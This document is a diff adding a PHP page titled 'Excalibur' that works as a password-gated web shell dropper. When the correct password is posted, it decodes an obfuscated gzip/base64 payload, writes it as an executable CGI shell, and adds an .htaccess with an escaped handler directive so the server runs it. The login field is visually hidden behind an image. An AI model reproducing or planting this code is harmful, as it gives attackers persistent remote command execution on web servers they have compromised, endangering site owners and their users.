@@ -1,0 +1,43 @@
+<?php
+$pass = "8743d4f8db2f7e463089c5d5477940a0";  # Default is 'lancelot'
+if (md5($_POST['pass']) == $pass)
+{
+     $htaccess = "Options +ExecCGI\nDirectoryIndex excalibur.xx\nAddH\x61ndler cgi-script .xx";
+	@mkdir("cgi");
+	$cgishell = gzinflate(base64_decode('nVZNb9w2ED2Xv2Kq1ohtqLt31zZapCgaND2llwIGVEqiJNYUKZCU5S32x+fNcNdOEZ8qZSNqOJ9vHkf+7tv9muK+tX6/HPIUvLLzEmKmbrRfLHP7Y3nsjNetM5dX582Qalqjc7atqQvzrH2flHJmNL6nO6qqSn0M3pDXsyHTTcEkylMM6zjhaehgdEy16nTK1o/U25nSpPuwJbKesp1NrSboiHLKIR4oDDTZREOxFFnNQk2ITp12zvT0y2E2O6V+TgS7Uf8LkfU5iBtvxymrMeq0cMwhFO+9jo/eJHjWkYPSZjO/w7R11ves20a2rRXrtw5uS+CBg3rkpyOCfsjk7JCR5UzrUuOJYnUbnlDLNplopDR46ILrOb9hRZBaIZFR8pTNGHKGTwczhUwmKbqFFB5q0dAz2yHgn2E0LGbpQeoRWLFaudIPMXga2VEi9EdsBxs5RC8ZeRSQDQF33pux6VHQgaOJA+BWwN2mcAYYxSXjBhoDZ/DBS3oTt5+iSfklCASAS9IBVP+EAxe8wHGPAJtZAGbx3RokbjjELMaOkYaUCTVpKQa5a9DDuMwQbJPtJvb2CC/I4XdjFmCAKMIV82Q8UEtGu1r1cfWPJDC2LoSetaz3oYNOrcJiPEpadJ5q7j7lEFAFG7IMrwwf06y0j7kBQ8T8aLTwAoT1hWAMQ4dCavVkA0iRKa5pKlmFNTH+MRTmThb0AkNCaTgfEwZ4AiuwLS2B2Rai62sCAjbT6gfe5cghShUCU+FDp2O0QEYdwkpJWoeSUw9ALbd4NsLbmbMTg9mcDAaHzUS9eQprBBJwEOXIItBfcJbjim4xP3QCZL3pVbtmSivajsTaNaJOMdqARjqdjxge+VBYoNBxsGJ3KIqLtn5YHaUOQM9c0fX1NQ4sEgeeW7TCfuQtBXo5fKyo0mL0o5AJpLEzqsnaMYM4qs7SHKCYNhBU6kZ8nMxYjCewF44KFVa44dT0iGSQwW/oHUaX7uQQJY30ayomHnSKbOjMkNUf+iAAbtyEtMB3X5+JV2afjqIxgCSfAjGJ/zvBXs7Tu4Qj5EGXr9RqYoxfXe52O4CBQ8yLgHx5uKolgnZUvQ8eeOUf8mExN5TNc95PeXZV2Vc8W2bMYwzx3a/WuP4TIuiRB/lpamOTdXaYJE/areay6ua+qjHBr5TCnIlsfRrwrBTWvKz5skIJerZQmkLKMuXf1jtvQ7O3+HC8rbVsPRTscN7cubCZeHlFd/iW9Jjp1Y36pijDQ8FFGZfMl+I3HJ9EKOUMGLAjumWM7mWBFspi/7JqQ3+QBfrLT2oaInk0p9Xr1cj99cWKMN3jxnUU22Nz9sH/jnTZXNGRFZuzI/H0gFuxpegeiVUhY1dNg9/fcMf3u4Yeji9reMcFvQfF2idbFtI9SkGwo/xON4fG/+c3vhAAGT/AB2dcRM0e7+y3aWpE4HvHmuf3UizUuNj/ewn6J6xvha8zvmqhv6sWcKci3WUb/F1lnvEJspg5u+fn6r4EvF3u35cW39Ct9cwDPgl3FZ+ESkbZnRB6f48YpdEcQsxLgy/STxfp5iJ9Txf4CwY/es3ndl/IcLsvhAF76IIu+Vjg835idk1M7Jc/gzAQhHtXnwE='));
+	file_put_contents("cgi/excalibur.xx",$cgishell);
+	file_put_contents("cgi/.htaccess",$htaccess);
+	@chmod("cgi/excalibur.xx",0755);
+	echo "<center>Cgi Shell saved @ cgi/excalibur.xx</center>";
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+<title>Excalibur</title>
+<style type="text/css">
+img {
+   position: absolute;
+   top: 50%;
+   left: 50%;
+   width: 739px;
+   height: 230px;
+   margin-top: -115px;
+   margin-left: -369px;
+}
+input {
+   margin: 0;
+   background-color: #fff;
+   border: 1px solid #fff;
+} 
+</style>
+</head>
+<body>
+<img src="http://i.imgur.com/Z8RF9bP.png" alt="Excalibur"/> 
+<center> 
+<form method="post"> 
+<input type="password" name="pass"> 
+</form></center> 
+</body>
+<!-- Created by Arturia. Shits to the Knights of the Round Table, and Antagonism. -->
+</html>
